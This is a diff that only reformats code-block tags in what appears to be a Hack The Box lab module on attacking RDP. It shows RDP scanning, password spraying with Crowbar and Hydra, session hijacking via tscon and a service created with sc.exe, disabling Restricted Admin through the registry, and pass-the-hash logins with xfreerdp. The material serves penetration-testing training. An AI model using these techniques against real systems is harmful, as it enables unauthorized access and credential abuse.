@@ -6,8 +6,7 @@
 
 By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# nmap -Pn -p3389 192.168.2.143 
 
 Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
@@ -29,8 +28,7 @@ One caveat on password guessing against Windows instances is that you should con
 
 Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# cat usernames.txt 
 
 root
@@ -43,8 +41,7 @@ administrator
 
 #### Crowbar - RDP Password Spraying
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 
 2022-04-07 15:35:50 START
@@ -58,8 +55,7 @@ We can also use `Hydra` to perform an RDP password spray attack.
 
 #### Hydra - RDP Password Spraying
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -79,8 +75,7 @@ We can RDP into the target system using the `rdesktop` client or `xfreerdp` clie
 
 #### RDP Login
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
 
 Autoselecting keyboard map 'en-us' from locale
@@ -123,15 +118,13 @@ As shown in the example below, we are logged in as the user `juurena` (UserID = 
 
 To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:
 
-```
-        cmd
+```bat
 C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
 ```
 
 If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.
 
-```
-        cmd
+```bat
 C:\htb> query user
 
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
@@ -147,8 +140,7 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 
 To run the command, we can start the `sessionhijack` service :
 
-```
-        cmd
+```bat
 C:\htb> net start sessionhijack
 ```
 
@@ -174,8 +166,7 @@ This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_
 
 #### Adding the DisableRestrictedAdmin Registry Key
 
-```
-        cmd
+```bat
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
@@ -183,8 +174,7 @@ C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v Disabl
 
 Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 
 [09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
